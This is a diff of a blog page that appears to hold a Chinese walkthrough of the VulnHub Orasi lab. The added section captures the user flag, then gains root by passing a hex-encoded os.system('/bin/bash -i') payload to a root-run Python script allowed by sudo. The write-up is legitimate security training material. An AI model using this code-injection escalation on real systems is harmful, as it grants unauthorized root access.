@@ -417,14 +417,14 @@ nmap -p- -sV -A 192.168.113.132
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        2.9k
+                        3.1k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        15 分
+                        16 分
                     </div>
                     
                 
@@ -650,7 +650,7 @@ drwxr-xr-x 18 root  root  4096 Feb 11  2021 ..
 drwxr-xr-x  3 irida irida 4096 Feb 11  2021 irida
 drwxr-xr-x  3 kori  kori  4096 Feb 11  2021 kori
 
-</code></pre><p>输入 sudo -l，发现当前用户是挂靠在<strong>kori</strong>上的，对一些参数进行了过滤</p>
+</code></pre><p>输入 sudo -l（可以显示当前权限），发现当前用户是挂靠在<strong>kori</strong>上的，对一些参数进行了过滤</p>
 <pre><code>sudo -l
 Matching Defaults entries for www-data on orasi:
     env_reset, mail_badpass,
@@ -787,6 +787,35 @@ irida.apk                     100%[=============================================
 
 </code></pre>
 <p><img src="http://alexjakin.github.io/medias/reward/vulnhub/orasi/5.png" alt="登陆成功"></p>
+<p>成功获取flag</p>
+<pre><code>
+irida@orasi:~$ cat user.txt
+2afb9cbb10c22dc7e154a8c434595948
+
+</code></pre><h3 id="提取root权限"><a href="#提取root权限" class="headerlink" title="提取root权限"></a>提取root权限</h3><p>输入sudo -l，显示当前权限，没有权限读<strong>oras.py</strong></p>
+<pre><code>
+irida@orasi:~$ sudo -l
+Matching Defaults entries for irida on orasi:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User irida may run the following commands on orasi:
+    (root) NOPASSWD: /usr/bin/python3 /root/oras.py
+
+</code></pre><p>运行一下/root/oras.py，发现需要输入十六进制数</p>
+<pre><code>
+irida@orasi:~$ sudo python3 /root/oras.py
+: id
+Traceback (most recent call last):
+  File &quot;/root/oras.py&quot;, line 7, in &lt;module&gt;
+    name = bytes.fromhex(name).decode(&#39;utf-8&#39;)
+ValueError: non-hexadecimal number found in fromhex() arg at position 0
+
+</code></pre><p>将下面代码进行十六进制编码，再输入</p>
+<blockquote>
+<p>import os;os.system(“/bin/bash -i”)<br>    696d706f7274206f733b6f732e73797374656d28222f62696e2f62617368202d692229 # 十六进制</p>
+</blockquote>
+<p>成功拿到root权限！该靶机到这里就提权结束</p>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnhub/orasi/6.png" alt="提权成功"></p>
 
             </div>
             <hr/>
@@ -1232,7 +1261,7 @@ Vulnhub是仿真渗透环境，攻击者通过一系列完整的渗透思路，�
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">70.4k</span>
+                <span class="white-color">70.6k</span>
             
 
             
